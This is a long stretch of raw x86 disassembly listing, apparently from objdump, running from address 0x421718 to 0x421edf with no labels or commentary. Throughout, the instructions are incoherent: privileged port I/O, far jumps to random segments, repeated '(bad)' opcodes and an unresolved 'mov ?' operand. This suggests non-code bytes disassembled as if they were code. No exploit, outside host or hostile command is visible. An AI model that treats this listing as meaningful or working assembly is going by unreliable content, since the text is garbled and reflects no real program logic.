  421718:	fnstsw WORD PTR [esi+0x4359bd78]
  42171e:	push   edx
  42171f:	ret    
  421720:	or     ch,ah
  421722:	imul   esp,esp,0x99c1b98f
  421728:	cli    
  421729:	jb     0x42172e
  42172b:	stos   BYTE PTR es:[edi],al
  42172c:	mov    al,bl
  42172e:	cld    
  42172f:	pop    ebx
  421730:	dec    esp
  421731:	pop    ecx
  421732:	sub    DWORD PTR [edx+0x63ff6017],ebx
  421738:	pusha  
  421739:	jo     0x421752
  42173b:	cmp    al,0x88
  42173d:	mov    cs,WORD PTR ds:0x370aa2b8
  421743:	and    ebx,DWORD PTR [ebp-0x48]
  421746:	ins    BYTE PTR es:[edi],dx
  421747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421748:	aad    0xfa
  42174a:	mov    al,ds:0x226953d2
  42174f:	sbb    BYTE PTR [eax-0x47],0xd2
  421753:	imul   esp,DWORD PTR [eax*2+0x334f2b11],0x890b3a93
  42175e:	dec    ecx
  42175f:	std    
  421760:	pop    edx
  421761:	test   al,0xe4
  421763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421764:	xchg   DWORD PTR [ecx-0x4f483f99],edi
  42176a:	cdq    
  42176b:	and    ch,bl
  42176d:	push   es
  42176e:	fcom   QWORD PTR [edx]
  421770:	je     0x421795
  421772:	ror    BYTE PTR [edx+0x44],cl
  421775:	es or  edx,0x9a2c219a
  42177c:	scas   eax,DWORD PTR es:[edi]
  42177d:	cli    
  42177e:	outs   dx,BYTE PTR ds:[esi]
  42177f:	add    DWORD PTR [ecx+0x4b9b151e],ebx
  421785:	test   al,0xf4
  421787:	jne    0x4217c8
  421789:	cmp    BYTE PTR [ecx-0x66d99780],0x2c
  421790:	adc    BYTE PTR [edx+edi*8],0xfa
  421794:	jb     0x42173c
  421796:	stos   DWORD PTR es:[edi],eax
  421797:	mov    ebp,0x7aa828cf
  42179c:	cmp    BYTE PTR [edi],al
  42179e:	mov    edi,0xc1f9cad
  4217a3:	and    al,BYTE PTR [edi+0x6d810ef5]
  4217a9:	adc    BYTE PTR [ecx+0x7b],0xbd
  4217ad:	sbb    cl,BYTE PTR [ecx-0x1b089000]
  4217b3:	jo     0x421771
  4217b5:	push   ebp
  4217b6:	mul    DWORD PTR [edx+0x74e19041]
  4217bc:	stos   DWORD PTR es:[edi],eax
  4217bd:	mov    edi,0xd91365c3
  4217c2:	jmp    0x3dc8dbfc
  4217c7:	std    
  4217c8:	sub    esp,DWORD PTR [edx]
  4217ca:	outs   dx,DWORD PTR ds:[esi]
  4217cb:	addr16 push edx
  4217cd:	aam    0xb7
  4217cf:	sbb    BYTE PTR [edi+0x2bf418dc],0x80
  4217d6:	sahf   
  4217d7:	and    ebx,0x9ac4cee7
  4217dd:	inc    ebp
  4217de:	or     edi,edi
  4217e0:	test   BYTE PTR [esi],dh
  4217e2:	adc    ecx,DWORD PTR [ecx+ebx*4-0x68]
  4217e6:	lods   eax,DWORD PTR ds:[esi]
  4217e8:	cld    
  4217e9:	out    0xc1,eax
  4217eb:	in     al,0xab
  4217ed:	mov    ebp,0xdc35ede7
  4217f2:	and    ebx,eax
  4217f4:	jmp    0xe3fe:0xf6fd65fe
  4217fb:	les    esi,FWORD PTR [ebx+0x2d17005c]
  421801:	mov    ecx,0x8003d588
  421806:	sti    
  421807:	inc    ebx
  421808:	sti    
  421809:	ret    0x58b5
  42180c:	div    BYTE PTR [ecx-0xcb470a8]
  421812:	or     cl,bh
  421814:	loopne 0x421868
  421816:	dec    edi
  421817:	sti    
  421818:	fldcw  WORD PTR [edx+ecx*2]
  42181b:	pop    eax
  42181c:	scas   eax,DWORD PTR es:[edi]
  42181d:	inc    eax
  42181e:	xchg   edx,eax
  42181f:	iret   
  421820:	cmp    ah,BYTE PTR fs:[esi-0x4e]
  421824:	cmc    
  421825:	xor    edx,edi
  421827:	or     al,0x46
  421829:	out    dx,eax
  42182a:	retf   
  42182b:	and    al,0x78
  42182d:	mov    esp,0x10bae3dc
  421832:	iret   
  421833:	dec    ebp
  421834:	or     eax,DWORD PTR [esi+esi*1-0x71da3b96]
  42183b:	pop    edi
  42183c:	and    al,0xa7
  42183e:	stos   BYTE PTR es:[edi],al
  42183f:	pop    eax
  421840:	mov    al,ds:0x8465d083
  421845:	call   0x717aa654
  42184a:	cmc    
  42184b:	cmp    al,0x4d
  42184d:	xchg   esi,eax
  42184e:	stos   BYTE PTR es:[edi],al
  42184f:	cwde   
  421850:	xchg   ecx,eax
  421851:	scas   eax,DWORD PTR es:[edi]
  421852:	dec    ecx
  421853:	retf   0xd8bb
  421856:	jae    0x4217fd
  421858:	inc    ebp
  421859:	jmp    0x42180d
  42185b:	nop
  42185c:	pop    ds
  42185d:	add    DWORD PTR [ecx],ebp
  42185f:	dec    eax
  421860:	ss loope 0x4218c2
  421863:	mov    esi,0x8ec6c23a
  421868:	or     esi,ecx
  42186a:	xchg   edx,eax
  42186b:	mov    esp,0xfc9cab5d
  421870:	sahf   
  421871:	in     eax,0x1f
  421873:	sub    BYTE PTR [ebx-0x46],0x9f
  421877:	jge    0x421852
  421879:	pop    es
  42187a:	ins    BYTE PTR es:[edi],dx
  42187b:	fisttp WORD PTR [edi]
  42187d:	pop    ds
  42187e:	cli    
  42187f:	repnz bound ecx,QWORD PTR [edx]
  421882:	and    eax,0xe5c68346
  421887:	mov    ds:0x9f799953,al
  42188c:	sub    al,0xde
  42188e:	imul   edx,DWORD PTR ds:0x53cb6691,0x79
  421895:	jmp    0x28451117
  42189a:	fsub   DWORD PTR [edx]
  42189c:	loop   0x4218c8
  42189e:	pop    ebp
  42189f:	add    edi,DWORD PTR [edi-0x77]
  4218a2:	add    al,BYTE PTR [eax-0x2c70732d]
  4218a8:	push   es
  4218a9:	imul   esi,DWORD PTR [esi],0x46b1cda3
  4218af:	ret    
  4218b0:	fstp   TBYTE PTR [ebx+0x5505ea1e]
  4218b6:	mov    edx,0x4616a65b
  4218bb:	cmp    eax,DWORD PTR [eax]
  4218bd:	mov    al,0x13
  4218bf:	cld    
  4218c0:	daa    
  4218c1:	ret    0x5d75
  4218c4:	sub    al,0xdf
  4218c6:	xor    bl,BYTE PTR [ebp-0x22e54add]
  4218cc:	pop    esp
  4218cd:	cmp    dh,dl
  4218cf:	loope  0x421898
  4218d1:	jnp    0x42188c
  4218d3:	div    DWORD PTR [ebx+0x70]
  4218d6:	test   al,0x26
  4218d8:	pushf  
  4218d9:	jmp    0x421913
  4218db:	jl     0x421892
  4218dd:	outs   dx,BYTE PTR ds:[esi]
  4218de:	adc    edx,DWORD PTR [edi-0x2f]
  4218e1:	jbe    0x4218bd
  4218e3:	jg     0x4218ea
  4218e5:	lahf   
  4218e6:	sub    BYTE PTR [edx],bl
  4218e8:	and    dh,al
  4218ea:	mov    ecx,0x47bb9ecb
  4218ef:	addr16 or dl,bl
  4218f2:	lods   al,BYTE PTR ds:[esi]
  4218f3:	sbb    al,0xdb
  4218f5:	push   esi
  4218f6:	and    ebx,DWORD PTR [ebx+0x29912e75]
  4218fc:	mov    dh,0xc6
  4218fe:	es in  eax,0x56
  421901:	pop    es
  421902:	cmp    edi,DWORD PTR [edi-0x1e2e0953]
  421908:	sar    DWORD PTR [edi-0x7564f664],cl
  42190e:	std    
  42190f:	dec    edx
  421910:	jmp    0x2d0edd4a
  421915:	mov    BYTE PTR [edx-0x5ae1a65],cl
  42191b:	fwait
  42191c:	pop    edx
  42191d:	out    0x2f,al
  42191f:	push   ds
  421920:	pop    ecx
  421921:	xchg   esp,ebp
  421923:	mov    cl,0x49
  421925:	ss mov esi,0xaa7bab64
  42192b:	ins    DWORD PTR es:[edi],dx
  42192c:	xchg   DWORD PTR ds:0x518f3099,eax
  421932:	out    0xb5,al
  421934:	push   edi
  421935:	mov    ds:0x573a2f31,eax
  42193a:	pop    es
  42193b:	rcl    DWORD PTR [ebx+ecx*8-0x4e27124c],cl
  421942:	aaa    
  421943:	pop    ecx
  421944:	fs jg  0x4219aa
  421947:	pop    esp
  421948:	jo     0x421992
  42194a:	clc    
  42194b:	or     eax,0x2ce9cb1f
  421950:	cld    
  421951:	push   ebp
  421952:	js     0x421934
  421954:	das    
  421955:	pop    esi
  421956:	fisubr DWORD PTR [ecx-0x4b]
  421959:	mov    cl,0x73
  42195b:	jns    0x421904
  42195d:	mov    eax,ds:0x95321d63
  421962:	into   
  421963:	fwait
  421964:	xor    al,0xbd
  421966:	sub    eax,0x5683f1db
  42196b:	push   edx
  42196c:	stc    
  42196d:	pop    ecx
  42196e:	pop    es
  42196f:	stos   BYTE PTR es:[edi],al
  421970:	sub    DWORD PTR ds:0xf2279f6,ebx
  421976:	stc    
  421977:	js     0x421988
  421979:	repnz mov esp,0x69029098
  42197f:	xchg   edi,eax
  421980:	in     al,dx
  421981:	or     eax,0xbfece476
  421986:	out    dx,eax
  421987:	push   0x41
  421989:	aaa    
  42198a:	sar    DWORD PTR ds:0x2ca82638,0xed
  421991:	mov    edx,ecx
  421993:	or     al,0xce
  421995:	mov    bh,0xf2
  421997:	aas    
  421998:	lock inc eax
  42199a:	outs   dx,BYTE PTR ds:[esi]
  42199b:	jb     0x421941
  42199d:	pop    edi
  42199e:	mov    DWORD PTR [esi-0xa],edx
  4219a1:	pop    esp
  4219a2:	cmp    DWORD PTR [edi],eax
  4219a4:	xchg   ecx,eax
  4219a5:	in     al,0xdf
  4219a7:	push   0x50
  4219a9:	sbb    esp,eax
  4219ab:	or     DWORD PTR [ebp+0x40be55a0],0x1cacf358
  4219b5:	scas   al,BYTE PTR es:[edi]
  4219b6:	stos   DWORD PTR es:[edi],eax
  4219b7:	ror    BYTE PTR [edi-0xd5719a4],0x0
  4219be:	and    al,0xd6
  4219c0:	ins    DWORD PTR es:[edi],dx
  4219c1:	add    DWORD PTR [esi+esi*1],ebx
  4219c4:	mov    bh,0x63
  4219c6:	and    ebp,ebp
  4219c8:	mov    ds:0x9e068770,al
  4219cd:	push   cs
  4219ce:	mov    edx,0x700e8b40
  4219d3:	shr    ecx,1
  4219d5:	add    edx,ebp
  4219d7:	out    0xda,eax
  4219d9:	pop    ecx
  4219da:	fcom   QWORD PTR [edi+eax*1+0x3bee3311]
  4219e1:	(bad)  
  4219e2:	sbb    ebp,DWORD PTR [ebx+0x70]
  4219e5:	adc    DWORD PTR [ebx],ecx
  4219e7:	std    
  4219e8:	jne    0x421a51
  4219ea:	imul   esp,ebx,0x937c0821
  4219f0:	jge    0x421a6a
  4219f2:	stc    
  4219f3:	or     DWORD PTR [esi-0x30],esp
  4219f6:	imul   eax,DWORD PTR [eax-0x58],0x3ff339e0
  4219fd:	jae    0x4219d6
  4219ff:	xor    BYTE PTR [esi],dh
  421a01:	out    0xdd,eax
  421a03:	dec    edx
  421a04:	das    
  421a05:	add    ecx,DWORD PTR [ebx+edx*4]
  421a08:	test   eax,0x49b9a8ee
  421a0d:	mov    eax,ds:0xd0eb8c7
  421a12:	outs   dx,BYTE PTR ds:[esi]
  421a13:	xchg   esi,eax
  421a14:	test   DWORD PTR ds:0x23596d8c,ecx
  421a1a:	loop   0x421a0b
  421a1c:	cdq    
  421a1d:	and    esp,DWORD PTR [esp+ebp*8-0x21de8b08]
  421a24:	or     ebp,ecx
  421a26:	or     BYTE PTR [ebp-0x1f],0xe
  421a2a:	mov    dh,BYTE PTR fs:0x8e689daa
  421a31:	push   ecx
  421a32:	sahf   
  421a33:	adc    DWORD PTR [edx-0x2a],ebp
  421a36:	or     al,0x48
  421a38:	rcl    DWORD PTR [ebx-0x63],cl
  421a3b:	call   0x88503a83
  421a40:	mov    al,0xf5
  421a42:	xchg   ecx,eax
  421a43:	jmp    0xfad8476
  421a48:	outs   dx,DWORD PTR ds:[esi]
  421a49:	(bad)  
  421a4a:	scas   al,BYTE PTR es:[edi]
  421a4b:	out    0x88,al
  421a4d:	xchg   ebp,eax
  421a4e:	dec    edx
  421a4f:	icebp  
  421a50:	mov    esp,ecx
  421a52:	dec    edi
  421a53:	xchg   DWORD PTR [esi],edx
  421a55:	in     al,dx
  421a56:	xchg   edx,eax
  421a57:	fistp  QWORD PTR [esi-0x19cb34c4]
  421a5d:	inc    esp
  421a5e:	dec    edi
  421a5f:	jns    0x421acf
  421a61:	inc    esp
  421a62:	mov    dh,0xa3
  421a64:	in     al,0x32
  421a66:	inc    ebp
  421a67:	dec    edi
  421a68:	retf   0x8823
  421a6b:	mov    ?,WORD PTR [esi-0x48]
  421a6e:	adc    BYTE PTR [esi+0x5b],dh
  421a71:	add    DWORD PTR [ecx],edx
  421a73:	xor    ah,al
  421a75:	retf   0x4eb4
  421a78:	scas   eax,DWORD PTR es:[edi]
  421a79:	ret    0x8aed
  421a7c:	mov    cl,0x64
  421a7e:	lock adc ecx,ecx
  421a81:	pop    ecx
  421a82:	in     al,0x5d
  421a84:	in     eax,0x90
  421a86:	adc    al,0xa2
  421a88:	mov    cs:0xaf86b8ce,al
  421a8e:	int3   
  421a8f:	inc    eax
  421a90:	test   DWORD PTR [ebp-0x54aaae07],edi
  421a96:	sahf   
  421a97:	mov    eax,0x59b5904b
  421a9c:	jmp    0xdf25:0xaabfe55e
  421aa3:	adc    bh,BYTE PTR [edx]
  421aa5:	(bad)  
  421aa6:	lds    edi,FWORD PTR ds:0xc408e019
  421aac:	sub    eax,0x704067a3
  421ab1:	pop    es
  421ab2:	xor    al,0x7a
  421ab4:	push   DWORD PTR [edi+0x4f]
  421ab7:	popf   
  421ab8:	or     ebp,0xffffffcc
  421abb:	xlat   BYTE PTR ds:[ebx]
  421abc:	sub    BYTE PTR [ebx],al
  421abe:	mov    bh,0xe3
  421ac0:	add    DWORD PTR [ebx],ebx
  421ac2:	pusha  
  421ac3:	retf   0x898d
  421ac6:	xor    al,0x88
  421ac8:	icebp  
  421ac9:	sahf   
  421aca:	jne    0x421abc
  421acc:	int    0x71
  421ace:	or     DWORD PTR [ebx-0x2d],ebp
  421ad1:	xchg   BYTE PTR [edx+0x2b4a0b63],bh
  421ad7:	pop    ds
  421ad8:	ss loop 0x421b1e
  421adb:	adc    al,0xa0
  421add:	int3   
  421ade:	js     0x421b5d
  421ae0:	dec    esp
  421ae1:	loop   0x421ae2
  421ae3:	xor    esp,edx
  421ae5:	stc    
  421ae6:	xor    BYTE PTR [eax],0x12
  421ae9:	mov    ecx,0x488d2ebe
  421aee:	in     al,dx
  421aef:	push   ss
  421af0:	pop    esp
  421af1:	and    dh,BYTE PTR ds:0x4566b3ae
  421af7:	out    0x2d,eax
  421af9:	or     ah,0x44
  421afc:	bound  edi,QWORD PTR [edx-0x90e2daa]
  421b02:	adc    bh,dl
  421b04:	out    dx,eax
  421b05:	inc    ecx
  421b06:	sbb    BYTE PTR [edi],bh
  421b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b09:	pop    ebp
  421b0a:	mov    ds:0xd782e594,al
  421b0f:	add    eax,0xd6865a8d
  421b14:	pop    es
  421b15:	cmp    edx,DWORD PTR [ecx+0x56112ead]
  421b1b:	pop    esi
  421b1c:	add    DWORD PTR [esi-0x52],eax
  421b1f:	mov    eax,0x15ed118c
  421b24:	sub    edi,eax
  421b26:	jmp    0x7751:0x81ad993c
  421b2d:	xor    eax,0xddef6303
  421b32:	loopne 0x421af9
  421b34:	and    edx,ebp
  421b36:	lods   al,BYTE PTR ds:[esi]
  421b37:	xchg   esi,esi
  421b39:	push   cs
  421b3a:	cmp    bl,BYTE PTR [esi+0x60]
  421b3d:	ins    BYTE PTR es:[edi],dx
  421b3e:	pop    ebx
  421b3f:	add    bh,al
  421b41:	xchg   ebx,eax
  421b42:	dec    esp
  421b43:	ret    
  421b44:	test   al,0xf5
  421b46:	mov    al,0xf2
  421b48:	lock aaa 
  421b4a:	in     eax,0x8b
  421b4c:	ds mov ebp,0xfbb7bf81
  421b52:	mul    edi
  421b54:	fisub  DWORD PTR [edi+0x3d]
  421b57:	das    
  421b58:	pushf  
  421b59:	out    dx,eax
  421b5a:	shr    edi,1
  421b5c:	or     al,0x1a
  421b5e:	inc    ebx
  421b5f:	pop    ds
  421b60:	out    0x17,eax
  421b62:	mov    cl,BYTE PTR [eax-0x678e1d19]
  421b68:	mul    DWORD PTR [ebx+0x1d]
  421b6b:	jp     0x421b08
  421b6d:	sub    eax,0xb7f90a4d
  421b72:	popf   
  421b73:	pop    edx
  421b74:	mov    eax,0x23d0410b
  421b79:	mov    WORD PTR [edi+0x3e],ss
  421b7c:	sbb    al,0x7a
  421b7e:	(bad)  
  421b7f:	jmp    0x421bb5
  421b81:	frstor [esi+0x5d]
  421b84:	ret    0x9f35
  421b87:	pop    edi
  421b88:	mov    ch,0x80
  421b8a:	xor    eax,0x44a43d8d
  421b8f:	dec    edi
  421b90:	lea    ebx,[esi+0x4b]
  421b93:	rcr    al,0x94
  421b96:	sub    DWORD PTR [ebp+esi*2-0x42],edx
  421b9a:	mov    bl,0xd6
  421b9c:	in     eax,0x0
  421b9e:	add    BYTE PTR [eax],al
  421ba0:	add    BYTE PTR [eax],al
  421ba2:	sbb    edi,DWORD PTR [esi-0x25106512]
  421ba8:	jg     0x421b69
  421baa:	call   0x157d:0xd1770da0
  421bb1:	cmp    DWORD PTR [esi-0x6b],edi
  421bb4:	add    DWORD PTR [eax],eax
  421bb6:	repz add al,0x0
  421bb9:	add    BYTE PTR [ecx-0x3a],bh
  421bbc:	add    DWORD PTR [edx-0xc],eax
  421bbf:	pop    ebx
  421bc0:	pop    eax
  421bc1:	pop    es
  421bc2:	adc    al,ah
  421bc4:	sub    eax,0xaaff2371
  421bc9:	test   DWORD PTR [ecx],ecx
  421bcb:	in     eax,0x27
  421bcd:	pusha  
  421bce:	pop    ebp
  421bcf:	inc    esp
  421bd0:	out    0xf4,al
  421bd2:	loopne 0x421b55
  421bd4:	leave  
  421bd5:	xchg   BYTE PTR [edx-0x194aaf54],ch
  421bdb:	sti    
  421bdc:	adc    bh,BYTE PTR cs:[ebp+0x44bfb7f3]
  421be3:	pop    esi
  421be4:	xchg   edi,eax
  421be5:	mov    edx,0xbd6d22ad
  421bea:	shl    BYTE PTR [ecx+ebp*1],0x39
  421bee:	mov    bh,0x1e
  421bf0:	(bad)  
  421bf1:	mov    bh,0x77
  421bf3:	ret    0x15fc
  421bf6:	out    0xa,al
  421bf8:	dec    ebp
  421bf9:	daa    
  421bfa:	cs test al,0x8a
  421bfd:	or     eax,0x2dbbbdc4
  421c02:	outs   dx,BYTE PTR ds:[esi]
  421c03:	adc    al,0xf6
  421c05:	jnp    0x421be5
  421c07:	call   0x58078fb3
  421c0c:	cmovl  ebx,DWORD PTR [eax+eax*4+0x53]
  421c11:	or     BYTE PTR [edi],dl
  421c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c14:	xor    eax,0xf5a56d8f
  421c19:	outs   dx,BYTE PTR ds:[esi]
  421c1a:	mov    ds:0x5b51dd6f,al
  421c1f:	nop
  421c20:	fld    st(3)
  421c22:	loope  0x421bab
  421c24:	inc    ebp
  421c25:	clc    
  421c26:	mov    edx,0xea778f74
  421c2b:	jg     0x421c32
  421c2d:	ins    DWORD PTR es:[edi],dx
  421c2e:	jmp    0x421c48
  421c30:	jp     0x421c44
  421c32:	sbb    DWORD PTR [ecx],ecx
  421c34:	lods   eax,DWORD PTR ds:[esi]
  421c35:	mov    DWORD PTR [edi+0x2e],ecx
  421c38:	mov    BYTE PTR [edi+edi*8+0x2b998024],ch
  421c3f:	(bad)  
  421c40:	sti    
  421c41:	inc    esi
  421c42:	push   ebp
  421c43:	sub    BYTE PTR [ecx],dl
  421c45:	inc    ebp
  421c46:	shl    BYTE PTR [edi],cl
  421c48:	mov    bh,0xe
  421c4a:	mov    cl,0xde
  421c4c:	repnz xor bl,bh
  421c4f:	add    BYTE PTR [esi+0x1f],bl
  421c52:	push   esi
  421c53:	xor    al,dl
  421c55:	jle    0x421bdf
  421c57:	xchg   esp,eax
  421c58:	mov    dh,0xfc
  421c5a:	pop    es
  421c5b:	xchg   edx,eax
  421c5c:	mov    cl,0x1c
  421c5e:	mov    ecx,0xb2d387fa
  421c63:	(bad)  
  421c64:	out    dx,al
  421c65:	xor    cl,BYTE PTR [eax+0x4a]
  421c68:	dec    ecx
  421c69:	loop   0x421c9c
  421c6b:	aad    0xd3
  421c6d:	repz xor al,0x7c
  421c70:	push   esp
  421c71:	dec    edx
  421c72:	shl    BYTE PTR [ebx-0x17ddc548],1
  421c78:	mov    al,0xc7
  421c7a:	mov    ds:0x44104f69,eax
  421c7f:	adc    DWORD PTR [ebp+0x3a],esi
  421c82:	xchg   edx,eax
  421c83:	fistp  WORD PTR [edx+eax*8+0xe]
  421c87:	call   0x788de922
  421c8c:	test   eax,0xc16ecdd0
  421c91:	dec    edx
  421c92:	std    
  421c93:	mov    bh,0x8c
  421c95:	jns    0x421c63
  421c97:	and    DWORD PTR [ecx-0x30],0xe25db38e
  421c9e:	cdq    
  421c9f:	ja     0x421d0f
  421ca1:	enter  0x7575,0x39
  421ca5:	cmc    
  421ca6:	pop    esp
  421ca7:	retf   
  421ca8:	xor    BYTE PTR [ebx+0x3bfaeecf],dh
  421cae:	clc    
  421caf:	pop    esi
  421cb0:	mov    edi,0xb6128f5b
  421cb5:	jb     0x421cac
  421cb7:	jnp    0x421c91
  421cb9:	dec    edx
  421cba:	pop    ss
  421cbb:	sbb    al,0x31
  421cbd:	int    0xb7
  421cbf:	pop    ecx
  421cc0:	in     eax,0x73
  421cc2:	ss retf 0xcc1f
  421cc6:	xchg   ecx,eax
  421cc7:	sub    BYTE PTR [ebx+0x51],dl
  421cca:	push   ebp
  421ccb:	pop    ebp
  421ccc:	mov    edx,0xbe91b7da
  421cd1:	neg    BYTE PTR [ecx]
  421cd3:	push   es
  421cd4:	sbb    DWORD PTR [ebx-0x48cb722b],ebp
  421cda:	faddp  st(2),st
  421cdc:	push   cs
  421cdd:	stc    
  421cde:	xchg   ecx,eax
  421cdf:	pop    esp
  421ce0:	icebp  
  421ce1:	fwait
  421ce2:	ror    BYTE PTR [esi-0x74],cl
  421ce5:	push   esp
  421ce6:	ret    
  421ce7:	sahf   
  421ce8:	addr16 xchg ebx,eax
  421cea:	mov    BYTE PTR [ebx+ebp*1-0x4],bh
  421cee:	mov    ecx,0xf5a0f00e
  421cf3:	mov    bl,0x57
  421cf5:	test   BYTE PTR [edi],0xb0
  421cf8:	xlat   BYTE PTR ds:[ebx]
  421cf9:	mov    ebp,0x251cd69d
  421cfe:	sbb    DWORD PTR [edi],edx
  421d00:	fisubr DWORD PTR [esi-0x54]
  421d03:	sub    eax,0xaceb7b1d
  421d08:	stos   DWORD PTR es:[edi],eax
  421d09:	out    0xf2,eax
  421d0b:	stc    
  421d0c:	xchg   esp,eax
  421d0d:	jo     0x421d13
  421d0f:	and    ebp,DWORD PTR [ebx-0x3e241c6d]
  421d15:	cmp    eax,0xa5fc0076
  421d1a:	call   FWORD PTR ds:0x7aea5c2f
  421d20:	jg     0x421d7d
  421d22:	mov    WORD PTR [ecx],ss
  421d24:	jb     0x421d26
  421d26:	inc    edi
  421d27:	mov    edi,0xab82f657
  421d2c:	frstor [esi+0x5a]
  421d2f:	repnz push cs
  421d31:	shr    BYTE PTR [ebx+esi*4],1
  421d34:	xor    al,0x2c
  421d36:	xchg   ebx,eax
  421d37:	popa   
  421d38:	(bad)  
  421d39:	push   edx
  421d3a:	fwait
  421d3b:	test   eax,0xda05e680
  421d40:	mov    ds:0x42ae198a,al
  421d45:	jbe    0x421d88
  421d47:	and    cl,BYTE PTR [ebp-0x11afb98e]
  421d4d:	xchg   ecx,eax
  421d4e:	in     al,0x11
  421d50:	inc    edx
  421d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d52:	fldcw  WORD PTR [ebp+0x44]
  421d55:	sub    BYTE PTR [edi+0x58],ah
  421d58:	ins    DWORD PTR es:[edi],dx
  421d59:	adc    BYTE PTR [edx+ecx*2],ah
  421d5c:	ins    DWORD PTR es:[edi],dx
  421d5d:	jle    0x421dc6
  421d5f:	inc    eax
  421d60:	or     BYTE PTR [ebx],dl
  421d62:	xchg   edi,eax
  421d63:	or     ebx,esi
  421d65:	test   eax,0x93e95f6d
  421d6a:	sar    DWORD PTR [eax+0x4132af0c],cl
  421d70:	aam    0xec
  421d72:	cwde   
  421d73:	icebp  
  421d74:	cmp    ah,BYTE PTR [ecx-0x7ce69edb]
  421d7a:	sbb    ch,BYTE PTR [edx]
  421d7c:	jb     0x421d6c
  421d7e:	mov    cl,0xaf
  421d80:	loope  0x421d26
  421d82:	xchg   BYTE PTR [ebp*4+0x6121f4cf],cl
  421d89:	xor    BYTE PTR [ebx+edx*8-0x37],dh
  421d8d:	out    0x51,al
  421d8f:	add    al,0x7e
  421d91:	push   0xf47a5a59
  421d96:	rol    ah,cl
  421d98:	or     eax,0xf10b421b
  421d9d:	cmp    edi,DWORD PTR [edi]
  421d9f:	test   BYTE PTR [ebx-0x1b272183],bl
  421da5:	and    BYTE PTR [eax],cl
  421da7:	ins    BYTE PTR es:[edi],dx
  421da8:	shrd   DWORD PTR [esi],edi,0xf7
  421dac:	sub    al,0x31
  421dae:	je     0x421de0
  421db0:	jle    0x421d71
  421db2:	adc    ch,BYTE PTR [edx+0x517c7298]
  421db8:	ret    0x3e34
  421dbb:	icebp  
  421dbc:	repz xchg ebx,eax
  421dbe:	push   ebp
  421dbf:	ret    0xaaa1
  421dc2:	ins    DWORD PTR es:[edi],dx
  421dc3:	out    dx,eax
  421dc4:	add    eax,0x27026d05
  421dc9:	fidivr WORD PTR [ebx]
  421dcb:	imul   ebx,ecx,0xf0b7b53b
  421dd1:	in     al,0x8b
  421dd3:	ins    DWORD PTR es:[edi],dx
  421dd4:	clc    
  421dd5:	sbb    DWORD PTR [ebp-0x13039177],eax
  421ddb:	sahf   
  421ddc:	and    BYTE PTR [ebx],dh
  421dde:	call   0x3371:0xb583baa5
  421de5:	mov    bl,0xf0
  421de7:	sbb    eax,0x7a6c9dc5
  421dec:	es xor al,0x18
  421def:	mov    bl,0x77
  421df1:	and    BYTE PTR [edi-0x50],cl
  421df4:	iret   
  421df5:	loope  0x421d78
  421df7:	in     al,dx
  421df8:	pushf  
  421df9:	push   cs
  421dfa:	call   0x9356:0xd39ff8d3
  421e01:	push   0xffffffc5
  421e03:	pop    edi
  421e04:	jnp    0x421e1d
  421e06:	xchg   BYTE PTR [ebp-0x82fb47c],dl
  421e0c:	imul   esp,DWORD PTR [edi+eiz*2-0x591dd4d8],0xfffffffa
  421e14:	enter  0x43c3,0x9
  421e18:	das    
  421e19:	je     0x421dcf
  421e1b:	xor    al,0x92
  421e1d:	cs adc eax,0x17470a36
  421e23:	(bad)  
  421e24:	mov    eax,DWORD PTR [ebp-0x3a6c3325]
  421e2a:	aaa    
  421e2b:	mov    ds:0xfc2520c4,eax
  421e30:	mov    ebp,0x81973667
  421e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e36:	jne    0x421e93
  421e38:	stos   BYTE PTR es:[edi],al
  421e39:	mov    edi,0xe9100326
  421e3e:	dec    ebx
  421e3f:	popa   
  421e40:	push   ebx
  421e41:	mov    ebx,DWORD PTR [ebx-0x76]
  421e44:	fist   WORD PTR [eax]
  421e46:	ins    BYTE PTR es:[edi],dx
  421e47:	fmul   QWORD PTR [ebx]
  421e49:	and    al,0xb9
  421e4b:	clc    
  421e4c:	bound  esp,QWORD PTR [esi]
  421e4e:	pop    esi
  421e4f:	retf   0xfd18
  421e52:	(bad)  
  421e53:	mov    ebp,0xd9617ecd
  421e58:	sbb    ebx,DWORD PTR [esi]
  421e5a:	ret    0x2c6a
  421e5d:	aad    0x11
  421e5f:	daa    
  421e60:	jecxz  0x421e0d
  421e62:	inc    esp
  421e63:	push   ds
  421e64:	jno    0x421e5f
  421e66:	imul   esi,DWORD PTR [edi],0x78b5b68f
  421e6c:	jns    0x421e3e
  421e6e:	push   0x4
  421e70:	stos   DWORD PTR es:[edi],eax
  421e71:	cs jle 0x421e58
  421e74:	in     eax,dx
  421e75:	push   esi
  421e76:	arpl   dx,di
  421e78:	adc    DWORD PTR [ebp+ebp*4-0x53],esi
  421e7c:	pop    edi
  421e7d:	or     eax,0x1692e231
  421e82:	sbb    BYTE PTR [ecx],cl
  421e84:	mov    dl,0x6d
  421e86:	clc    
  421e87:	in     eax,dx
  421e88:	sub    ah,BYTE PTR [esi+eiz*2]
  421e8b:	inc    edi
  421e8c:	in     eax,dx
  421e8d:	mov    dh,0xba
  421e8f:	sbb    al,0xab
  421e91:	mov    ds:0xe5459c92,eax
  421e96:	loop   0x421e90
  421e98:	inc    DWORD PTR [ecx]
  421e9a:	mov    ds:0x3a463f6e,al
  421e9f:	dec    ebx
  421ea0:	iret   
  421ea1:	cmp    al,0xcb
  421ea3:	xor    al,BYTE PTR [edx+eiz*4]
  421ea6:	in     al,0x81
  421ea8:	cmp    DWORD PTR [edi],0xce2d5841
  421eae:	stc    
  421eaf:	or     BYTE PTR [eax],cl
  421eb1:	and    BYTE PTR [bp+0x40],dl
  421eb5:	dec    esp
  421eb6:	sub    DWORD PTR [eax-0x1f],eax
  421eb9:	sbb    cl,BYTE PTR [esi+0x58759c20]
  421ebf:	stos   BYTE PTR es:[edi],al
  421ec0:	or     eax,0xd88106b5
  421ec5:	shr    DWORD PTR es:[esp+ebx*1],0x2d
  421eca:	and    esp,DWORD PTR ds:0xedcd5f90
  421ed0:	es cli 
  421ed2:	shl    BYTE PTR [esi+0x15],cl
  421ed5:	aaa    
  421ed6:	push   0x1e0870aa
  421edb:	lds    ebx,FWORD PTR [eax]
  421edd:	jmp    0x421ef0
  421edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
